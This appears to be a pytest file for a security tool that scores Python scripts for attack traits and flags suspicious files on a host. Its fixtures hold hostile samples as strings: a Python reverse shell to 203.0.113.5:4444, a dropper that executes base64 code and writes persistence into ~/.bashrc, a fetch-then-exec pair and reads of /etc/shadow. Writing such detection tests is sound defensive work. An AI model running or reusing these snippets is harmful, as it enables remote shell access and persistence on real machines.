"""2.2.15: Python scripts are scored by what an attack needs, not by style.

2.2.15: Python betikleri üsluba göre değil, saldırının ihtiyacına göre puanlanır.
"""
import hashlib
import json
from types import SimpleNamespace as NS

from satsuma import python_audit
from satsuma.host_store import HostStore

BENIGN = '''import base64, json
def load(text):
    return json.loads(base64.b64decode(text))
value = eval("1 + 1")
'''
DROPPER = '''import base64
exec(base64.b64decode("cHJpbnQoMSk="))
open(os.path.expanduser("~/.bashrc"), "a").write("python3 /tmp/x.py\\n")
'''
REVERSE = '''import socket, os, pty
s = socket.socket()
s.connect(("203.0.113.5", 4444))
os.dup2(s.fileno(), 0)
pty.spawn("/bin/sh")
'''


def test_ordinary_library_code_scores_nothing():
    points, hits = python_audit.score(BENIGN)
    assert points == 0 and hits == []


def test_attack_combinations_score_high():
    assert python_audit.score(DROPPER)[0] == 5
    points, hits = python_audit.score(REVERSE)
    assert points >= 4 and any(h['rule'] == 'reverse_shell' for h in hits)


def _tree(tmp_path):
    root = tmp_path / 'home'
    (root / 'satsuma' / 'proj').mkdir(parents=True)
    (root / 'satsuma' / 'proj' / 'util.py').write_text(BENIGN)
    (root / 'satsuma' / 'proj' / 'node_modules').mkdir()
    (root / 'satsuma' / 'proj' / 'node_modules' / 'x.py').write_text(REVERSE)
    tmp = tmp_path / 'tmp'
    tmp.mkdir()
    (tmp / 'update').write_text('#!/usr/bin/python3\n' + REVERSE)
    (tmp / 'update').chmod(0o755)
    (tmp / 'notes.txt').write_text(REVERSE)
    return root, tmp


def test_audit_finds_scripts_by_suffix_or_shebang_and_skips_noise(tmp_path):
    root, tmp = _tree(tmp_path)
    modified, scored = python_audit.audit({}, roots=(str(root), str(tmp)), autostart=set())
    assert modified == [] and [s['path'] for s in scored] == [str(tmp / 'update')]


def test_autostarted_script_gets_points_and_packaged_change_is_critical(tmp_path):
    root, tmp = _tree(tmp_path)
    lib = tmp_path / 'lib'
    lib.mkdir()
    (lib / 'os.py').write_text('backdoor = True\n')
    owned = {str(lib / 'os.py'): ('python3-libs', hashlib.sha256(b'original\n').hexdigest(), '8')}
    (root / 'satsuma' / 'proj' / 'sync.py').write_text("import urllib.request\nurllib.request.urlopen('http://x')\n")
    modified, scored = python_audit.audit(owned, roots=(str(root),), autostart={str(root / 'satsuma' / 'proj' / 'sync.py')})
    assert modified[0]['package'] == 'python3-libs'
    assert scored[0]['path'].endswith('sync.py') and scored[0]['points'] == 2


def test_run_records_findings_with_lines_and_proposal_never_moves(tmp_path):
    root, tmp = _tree(tmp_path)
    store = HostStore(tmp_path / 'host', test=True)
    runner = lambda *a, **k: NS(returncode=0, stdout='', stderr='')
    try:
        state = python_audit.run(store, manual=True, runner=runner, key='', roots=(str(root), str(tmp)),
                                 autostart=set(), packaged_dirs=[])
        assert state['high'] == [str(tmp / 'update')] and state['virustotal'] == 'no_key'
        body = json.loads(store.db.execute("SELECT body FROM findings").fetchone()[0])
        assert body['severity'] == 'high' and 'karantina al' in body['advice']
        assert any(h['line'] for h in body['item']['hits'])
        assert (tmp / 'update').exists()
        assert python_audit.run(store, manual=False, runner=runner, key='', roots=(str(root),), packaged_dirs=[]) == state
    finally:
        store.close()


def test_combination_halves_far_apart_in_a_library_do_not_count():
    library = 'from urllib.request import urlopen\n' + 'x = 1\n' * 200 + 'value = eval(expression)\n'
    assert python_audit.score(library)[0] == 0
    close = 'data = urlopen(url).read()\nexec(data)\n'
    assert python_audit.score(close)[0] == 3


def test_mentions_comments_and_profilers_are_not_persistence():
    # Real false positives seen on 7571 library files (2026-10-26).
    assert python_audit.score('# ensure /etc/cron.daily/apt is executable\n')[0] == 0
    assert python_audit.score('self.profile = core.profile_frombytes(f.read())\n')[0] == 0
    assert python_audit.score("malicious_files = ['/etc/shadow', '../../shadow']\n")[0] == 0
    assert python_audit.score("with open('/etc/shadow') as f:\n    data = f.read()\n")[0] == 2
